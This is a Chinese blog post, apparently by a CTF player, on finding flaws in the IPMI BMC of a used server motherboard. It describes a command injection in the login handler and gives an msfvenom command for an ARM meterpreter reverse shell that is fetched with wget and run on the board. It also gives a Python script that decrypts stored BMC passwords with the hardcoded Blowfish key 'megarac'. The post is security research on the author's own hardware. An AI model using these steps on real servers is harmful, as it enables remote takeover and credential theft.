@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <title>
+        一次对服务器主板IPMI BMC的漏洞挖掘 - Naivekun&#39;s blog
+      </title>
+    <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  
+  <meta name="theme-color" content="#000000" />
+  
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <meta name="description" content="0x0 背景 前几天在某鱼捡了个便宜主板 查了下应该是广达的工包测试板，全新，完全没资料网上查不到 服务器主板一般会有一个管理芯片独立于整个主板，管理主" />
+  <meta name="generator" content="Hugo 0.70.0 with theme pure" />
+  <title>一次对服务器主板IPMI BMC的漏洞挖掘 - Naivekun&#39;s blog</title>
+  
+  
+  <link rel="stylesheet" href="https://naivekun.com/css/style.min.7dc20efbc53647d41aa9ddea0c48e59300223d084e66ea0cbe7c30bd88903acc.css">
+  
+  <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css" async>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
+  <meta property="og:title" content="一次对服务器主板IPMI BMC的漏洞挖掘" />
+<meta property="og:description" content="0x0 背景 前几天在某鱼捡了个便宜主板 查了下应该是广达的工包测试板，全新，完全没资料网上查不到 服务器主板一般会有一个管理芯片独立于整个主板，管理主" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://naivekun.com/2020/08/hack-bmc/" />
+<meta property="article:published_time" content="2020-08-19T01:58:07+08:00" />
+<meta property="article:modified_time" content="2020-08-19T01:58:07+08:00" />
+<meta itemprop="name" content="一次对服务器主板IPMI BMC的漏洞挖掘">
+<meta itemprop="description" content="0x0 背景 前几天在某鱼捡了个便宜主板 查了下应该是广达的工包测试板，全新，完全没资料网上查不到 服务器主板一般会有一个管理芯片独立于整个主板，管理主">
+<meta itemprop="datePublished" content="2020-08-19T01:58:07&#43;08:00" />
+<meta itemprop="dateModified" content="2020-08-19T01:58:07&#43;08:00" />
+<meta itemprop="wordCount" content="1475">
+
+
+
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="一次对服务器主板IPMI BMC的漏洞挖掘"/>
+<meta name="twitter:description" content="0x0 背景 前几天在某鱼捡了个便宜主板 查了下应该是广达的工包测试板，全新，完全没资料网上查不到 服务器主板一般会有一个管理芯片独立于整个主板，管理主"/>
+
+  <!--[if lte IE 9]>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+    <![endif]-->
+
+  <!--[if lt IE 9]>
+      <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+      <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+    <![endif]-->
+
+</head>
+  </head>
+
+  
+  
+
+  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="slimContent">
+      <div class="navbar-header">
+        <div class="profile-block text-center">
+          <a id="avatar" href="https://github.com/naivekun" target="_blank">
+            <img class="img-circle img-rotate" src="https://naivekun.com/avatar.jpg" width="200" height="200">
+          </a>
+          <h2 id="name" class="hidden-xs hidden-sm">naivekun</h2>
+          <h3 id="title" class="hidden-xs hidden-sm hidden-md">CTFer</h3>
+          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Wuhan, China</small>
+        </div><div class="search" id="search-form-wrap">
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
+                        class="icon icon-search"></i></button>
+            </span>
+        </div>
+        <div class="ins-search">
+            <div class="ins-search-mask"></div>
+            <div class="ins-search-container">
+                <div class="ins-input-wrapper">
+                    <input type="text" class="ins-search-input" placeholder="Type something..."
+                        x-webkit-speech />
+                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
+                        aria-label="Close"><span aria-hidden="true">×</span></button>
+                </div>
+                <div class="ins-section-wrapper">
+                    <div class="ins-section-container"></div>
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+      </div>
+      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+        <ul class="nav navbar-nav main-nav">
+            <li class="menu-item menu-item-home">
+                <a href="/">
+                    <i class="icon icon-home-fill"></i>
+                  <span class="menu-title">Home</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-archives">
+                <a href="/posts/">
+                    <i class="icon icon-archives-fill"></i>
+                  <span class="menu-title">Archives</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-categories">
+                <a href="/categories/">
+                    <i class="icon icon-folder"></i>
+                  <span class="menu-title">Categories</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-tags">
+                <a href="/tags/">
+                    <i class="icon icon-tags"></i>
+                  <span class="menu-title">Tags</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-friends">
+                <a href="/friends/">
+                    <i class="icon icon-friendship"></i>
+                  <span class="menu-title">Friends</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-about">
+                <a href="/about/">
+                    <i class="icon icon-cup-fill"></i>
+                  <span class="menu-title">About</span>
+                </a>
+            </li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content"><script src="https://www.hackthebox.eu/badge/60818"></script>
+            </div>
+        </div>
+    </div>
+</div>
+
+      <div class="widget">
+    <h3 class="widget-title"> Categories</h3>
+    <div class="widget-body">
+        <ul class="category-list">
+            <li class="category-list-item"><a href="https://naivekun.com/categories/ctf/" class="category-list-link">ctf</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://naivekun.com/categories/hackthebox/" class="category-list-link">hackthebox</a><span class="category-list-count">13</span></li>
+            <li class="category-list-item"><a href="https://naivekun.com/categories/vulnhub/" class="category-list-link">vulnhub</a><span class="category-list-count">21</span></li>
+        </ul>
+    </div>
+</div>
+      <div class="widget">
+    <h3 class="widget-title"> Tags</h3>
+    <div class="widget-body">
+        <ul class="tag-list">
+            
+            
+            <li class="tag-list-item"><a href="https://naivekun.com/tags/ctf/" class="tag-list-link">ctf</a><span
+                    class="tag-list-count">2</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://naivekun.com/tags/hackthebox/" class="tag-list-link">hackthebox</a><span
+                    class="tag-list-count">13</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://naivekun.com/tags/vulnhub/" class="tag-list-link">vulnhub</a><span
+                    class="tag-list-count">21</span></li>
+            
+        </ul>
+
+    </div>
+</div>
+      
+<div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+        <ul class="recent-post-list list-unstyled no-thumbnail">
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2021/12/ma5671a-flash-openwrt/" class="title">68块钱MA5671A猫棒刷Openwrt</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-12-09 02:46:52 &#43;0800 &#43;0800" itemprop="datePublished">2021-12-09</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2020/10/hack-on-nrf/" class="title">nRF51系列单片机读取保护绕过</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-10-03 23:58:09 &#43;0800 &#43;0800" itemprop="datePublished">2020-10-03</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2020/08/hack-bmc/" class="title">一次对服务器主板IPMI BMC的漏洞挖掘</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-08-19 01:58:07 &#43;0800 &#43;0800" itemprop="datePublished">2020-08-19</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2020/07/tn3399-more/" class="title">TN3399板子填坑</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-07-23 18:03:36 &#43;0800 &#43;0800" itemprop="datePublished">2020-07-23</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2020/07/tn3399/" class="title">闲鱼便宜板子TN3399折腾全攻略</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-07-14 16:51:10 &#43;0800 &#43;0800" itemprop="datePublished">2020-07-14</time>
+                    </p>
+                </div>
+            </li>
+        </ul>
+    </div>
+</div>
+  </div>
+</aside>
+
+    
+    
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <h4 class="toc-title">Catalogue</h4>
+    <nav id="toc" class="js-toc toc">
+
+    </nav>
+  </div>
+</aside>
+<main class="main" role="main"><div class="content">
+  <article id="-" class="article article-type-" itemscope
+    itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      <h1 itemprop="name">
+  <a
+    class="article-title"
+    href="/2020/08/hack-bmc/"
+    >一次对服务器主板IPMI BMC的漏洞挖掘</a
+  >
+</h1>
+
+      <div class="article-meta">
+        
+<span class="article-date">
+  <i class="icon icon-calendar-check"></i>&nbsp;
+<a href="https://naivekun.com/2020/08/hack-bmc/" class="article-date">
+  <time datetime="2020-08-19 01:58:07 &#43;0800 &#43;0800" itemprop="datePublished">2020-08-19</time>
+</a>
+</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i>&nbsp;<a href="/2020/08/hack-bmc/#comments"
+            class="article-comment-link">Comments</a></span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 1475words</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 3minutes </span>
+      </div>
+    </div>
+    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
+      <h1 id="0x0-背景">0x0 背景</h1>
+<p>前几天在某鱼捡了个便宜主板</p>
+<p><img src="/images/2020-08-19-02-02-59.png" alt=""></p>
+<p>查了下应该是广达的工包测试板，全新，完全没资料网上查不到</p>
+<p>服务器主板一般会有一个管理芯片独立于整个主板，管理主板电源，温度，开关机，视频重定向。。。。然而ipmitool能连上获取信息，却没有web，ssh也是连上就断</p>
+<p><img src="/images/2020-08-19-02-01-46.png" alt=""></p>
+<p>于是找了一波文档，发现有个相似的型号的</p>
+<p><img src="/images/2020-08-19-02-04-16.png" alt=""></p>
+<p>通过ipmi raw command开启BMC Web</p>
+<p>看起来成功了。。。扫一下端口发现开了443</p>
+<p>于是打开浏览器去连接。。。发现连不上</p>
+<p><img src="/images/2020-08-19-02-05-53.png" alt=""></p>
+<p>这。。。报了个奇怪的错误</p>
+<p>注意到lighttpd，这种嵌入式设备服务端api都是用C写的。。。lighttpd会把请求交给一个二进制库处理。。应该是跑炸了，在html前面生成了一个<code>Parameter Error!</code></p>
+<p>然后发现ssh也是连不上的，连上之后立马connection close</p>
+<h1 id="0x1-分析固件">0x1 分析固件</h1>
+<p>查了一波资料，发现BMC芯片AST2400是个arm soc。。。板子上有自己独立的内存，SPI Flash。</p>
+<p><img src="/images/2020-08-19-02-25-17.png" alt=""></p>
+<p>艹，这不就是个大号路由器</p>
+<p>但是对着板子看了一圈也没看见串口在哪里，一般路由器的套路是能插串口改bootargs进系统，dump整个固件 or 传个gdb server进去</p>
+<p>于是搜了一波资料发现有个socflash的工具可以读取固件</p>
+<pre><code>socflash_64.exe -b dump.bin
+</code></pre>
+<p>即可dump下来BMC的整个SPI Flash存储器</p>
+<p>binwalk走一波</p>
+<p><img src="/images/2020-08-19-02-12-18.png" alt=""></p>
+<p>标准的linux嵌入式设备。。u-boot, kernel rootfs一个都不缺</p>
+<p><code>binwalk -e</code>提取即可</p>
+<p>注意到第一个cramfs是个完整的linux文件系统，jffs2是一些配置文件，第二个cramfs是个web静态文件打包</p>
+<p><img src="/images/2020-08-19-02-35-55.png" alt=""></p>
+<h1 id="0x2-发现web登录问题">0x2 发现web登录问题</h1>
+<p>既然提取了固件，直接暴力grep即可</p>
+<p><img src="/images/2020-08-19-02-28-22.png" alt=""></p>
+<p>再看下lighttpd配置文件，指向的正好是libmodhapi.so</p>
+<p><img src="/images/2020-08-19-02-30-24.png" alt=""></p>
+<p>那么api handler就在那个so中，拖进ida打开，找字符串</p>
+<p>发现了这里有这个<code>Parameter Error!</code></p>
+<p><img src="/images/2020-08-19-02-31-22.png" alt=""></p>
+<p>看下invalidUser交叉引用，找到了登录认证的部分</p>
+<p><img src="/images/2020-08-19-02-32-10.png" alt=""></p>
+<p>卧槽这也太蛇皮了。。。直接拼进system然后拿返回值，裸的命令注入</p>
+<p>正好没shell没法调试，从这拿个shell再说</p>
+<p>burp测一下</p>
+<p><img src="/images/2020-08-19-02-33-18.png" alt=""></p>
+<p>这边直接收到返回了</p>
+<p><img src="/images/2020-08-19-02-36-31.png" alt=""></p>
+<p>好，接下来需要弹一个shell</p>
+<h1 id="0x3-弹shell">0x3 弹shell</h1>
+<p>把reverse shell cheat sheet测了一个遍。。都没法弹。</p>
+<p>突然意识到。。。嵌入式设备用的busybox，没bash没nc啥都没有</p>
+<p>那就只能传个二进制程序进去跑了</p>
+<p>看了下kernel应该是arm小端序</p>
+<p>用msf生成payload</p>
+<pre><code>msfvenom -p linux/armle/meterpreter/reverse_tcp LHOST=192.168.2.132 LPORT=4445 -f elf &gt; meterpreter.elf
+</code></pre>
+<p>wget下载，chmod +x，然后执行。注意<code>+</code>要url编码不然会被当成空格</p>
+<p><img src="/images/2020-08-19-02-40-49.png" alt=""></p>
+<p><img src="/images/2020-08-19-02-41-01.png" alt=""></p>
+<p>即可弹回meterpreter</p>
+<p><img src="/images/2020-08-19-03-07-44.png" alt=""></p>
+<h1 id="0x4-后续">0x4 后续</h1>
+<p>有了shell啥都好办了，ssh登不上是有个配置文件写错了指向不存在的文件。。。出厂bug，果然是工厂流出的测试板</p>
+<h1 id="0x5-不安全的密码策略">0x5 不安全的密码策略</h1>
+<p>众所周知嵌入式设备特别喜欢硬编码密钥然后给密码对称加密一下。CISCO type 7 password就是这么搞的</p>
+<p>然后发现这个</p>
+<p><img src="/images/2020-08-19-15-36-56.png" alt=""></p>
+<p>于是看一下哪里处理的EncryptedPswd，找了一圈发现在<code>libipmi_helper.so.2.4.0</code>里</p>
+<p>继续暴力grep，核心逻辑在<code>libipmiamioempwdenc.so.2.1.0</code>这个库里面</p>
+<p>lib ipmi ami oem pwd enc</p>
+<p>名称看起来很合理</p>
+<p>丢进ida看看</p>
+<p><img src="/images/2020-08-19-16-04-24.png" alt=""></p>
+<p>跟到了<code>DecryptPassword</code>函数</p>
+<p>继续找找到了<code>libblowfish.so</code></p>
+<p><img src="/images/2020-08-19-16-06-14.png" alt=""></p>
+<p><img src="/images/2020-08-19-16-06-25.png" alt=""></p>
+<p>解密逻辑就这么一点了，找了一圈没发现iv在哪，应该是ecb模式了</p>
+<p>密码是SetEncryptKey从<code>/conf/pwdEncKey</code>获取的</p>
+<p><img src="/images/2020-08-19-16-11-53.png" alt=""></p>
+<p><img src="/images/2020-08-19-16-12-12.png" alt=""></p>
+<p>就是megarac，软件名</p>
+<p>于是搓个脚本解密一下</p>
+<pre><code>import blowfish
+import base64
+
+data = [
+    b&quot;jT+Yah6ySlTO9NOzIXxkogAAAAAAAAAA&quot;,
+    b&quot;OY7fIRe9fsQkinACXfgmUQAAAAAAAAAA&quot;,
+    b&quot;zvTTsyF8ZKLO9NOzIXxkogAAAAAAAAAA&quot;,
+    b&quot;f23Dq/SFBErO9NOzIXxkogAAAAAAAAAA&quot;,
+    b&quot;masB7IKqyJ1+7HMeU4vo9wAAAAAAAAAA&quot;
+]
+
+def decrypt(cipherText):
+    cipher = blowfish.Cipher(b&quot;megarac&quot;)
+    decrypted = b&quot;&quot;.join(cipher.decrypt_ecb(base64.b64decode(cipherText)))
+    return decrypted
+
+for i in data:
+    print(decrypt(i))
+</code></pre>
+<p>成功解密</p>
+<p><img src="/images/2020-08-19-16-13-43.png" alt=""></p>
+<p>emmm我服了，，写个哈希那么难吗？？？</p>
+
+    </div>
+    <div class="article-footer">
+<blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    <li class="post-copyright-link hidden-xs">
+      <strong>Permalink: </strong>
+      <a href="https://naivekun.com/2020/08/hack-bmc/" title="一次对服务器主板IPMI BMC的漏洞挖掘" target="_blank" rel="external">https://naivekun.com/2020/08/hack-bmc/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>License：</strong><a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
+    </li>
+  </ul>
+</blockquote>
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/naivekun" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="https://naivekun.com/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/naivekun" target="_blank"><span class="text-dark">naivekun</span><small class="ml-1x">CTFer</small></a></h3>
+        <div>Web/Pentest/Android</div>
+      </div>
+    </figure>
+  </div>
+</div>
+    </div>
+  </article>
+<section id="comments">
+</section>
+
+</div><nav class="bar bar-footer clearfix" data-stick-bottom>
+    <div class="bar-inner">
+        <ul class="pager pull-left">
+            <li class="prev">
+                <a href="https://naivekun.com/2020/07/tn3399-more/" title="TN3399板子填坑"><i
+                        class="icon icon-angle-left"
+                        aria-hidden="true"></i><span>&nbsp;&nbsp;Older</span></a>
+            </li>
+            <li class="next">
+                <a href="https://naivekun.com/2020/10/hack-on-nrf/"
+                    title="nRF51系列单片机读取保护绕过"><span>Newer&nbsp;&nbsp;</span><i
+                        class="icon icon-angle-right" aria-hidden="true"></i></a>
+            </li>
+            
+            <li class="toggle-toc">
+                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
+                    title="Catalogue" role="button">
+                    <span>[&nbsp;</span><span>Catalogue</span>
+                    <i class="text-collapsed icon icon-anchor"></i>
+                    <i class="text-in icon icon-close"></i>
+                    <span>]</span>
+                </a>
+            </li>
+        </ul>
+        
+        <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal"
+            data-target="#donateModal"><span>$</span></button>
+        
+        <div class="bar-right">
+        </div>
+    </div>
+</nav>
+
+
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+    <div class="modal-dialog" role="document">
+        <div class="modal-content donate">
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span
+                    aria-hidden="true">&times;</span></button>
+            <div class="modal-body">
+                <div class="donate-box">
+                    <div class="donate-head">
+                        <p>Maybe you could buy me a cup of coffee.</p>
+                    </div>
+                    <div class="tab-content">
+                        <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+                            <div class="donate-payimg">
+                                <img src="https://naivekun.com/donate/alipayimg.png"
+                                    alt="Scan Qrcode" title="Scan" />
+                            </div>
+                            <p class="text-muted mv">Scan this qrcode</p>
+                            <p class="text-grey">Open alipay app scan this qrcode, buy me a coffee!</p>
+                        </div>
+                        <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+                            <div class="donate-payimg">
+                                <img src="https://naivekun.com/donate/wechatpayimg.png"
+                                    alt="Scan Qrcode" title="Scan" />
+                            </div>
+                            <p class="text-muted mv">Scan this qrcode</p>
+                            <p class="text-grey">Open wechat app scan this qrcode, buy me a coffee!</p>
+                        </div>
+                    </div>
+                    <div class="donate-footer">
+                        <ul class="nav nav-tabs nav-justified" role="tablist">
+                            <li role="presentation" class="active">
+                                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay"
+                                    aria-expanded="true"><i class="icon icon-alipay"></i> alipay</a>
+                            </li>
+                            <li role="presentation" class="">
+                                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab"
+                                    aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i>
+                                    wechat payment</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+<ul class="social-links">
+    <li><a href="https://github.com/naivekun" target="_blank" title="github" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-github"></i></a></li>
+    <li><a href="https://naivekun.com/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-rss"></i></a></li>
+</ul>
+  <div class="copyright">
+    &copy;&nbsp;2018  -
+    2021
+    <div class="publishby">
+        Theme by naivekun base on<a href="https://github.com/xiaoheiAh/hugo-theme-pure" target="_blank"> pure</a>.
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+            showMathMenu: false, //disables context menu
+            tex2jax: {
+            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
+           }
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+<script>
+    window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/python.min.js" defer></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/javascript.min.js" defer></script><script>
+    hljs.configure({
+        tabReplace: '    ', 
+        classPrefix: ''     
+        
+    })
+    hljs.initHighlightingOnLoad();
+</script>
+<script src="https://naivekun.com/js/application.min.bdeb64b910570b6c41badc6a05b7afb0c8ad9efd8525de3c7257d59e786326a3.js"></script>
+<script src="https://naivekun.com/js/plugin.min.51ff8c7317566f82259170fa36e09c4493adc9b9378b427a01ad3f017ebac7dd.js"></script>
+
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            ROOT_URL: 'https:\/\/naivekun.com',
+            CONTENT_URL: 'https:\/\/naivekun.com\/searchindex.json ',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script type="text/javascript" src="https://naivekun.com/js/insight.min.a343cd9a5a7698336b28ef3a7c16a3a1b1d2d5fb17dc8ed04022bbe08cc5459073a15bdafa3a8a58cdd56080784bdd69fa70b1ae8597565c799c57ed00f0e120.js" defer></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<script>
+    tocbot.init({
+        
+        tocSelector: '.js-toc',
+        
+        contentSelector: '.js-toc-content',
+        
+        headingSelector: 'h1, h2, h3',
+        
+        hasInnerContainers: true,
+    });
+</script>
+
+
+  </body>
+</html>
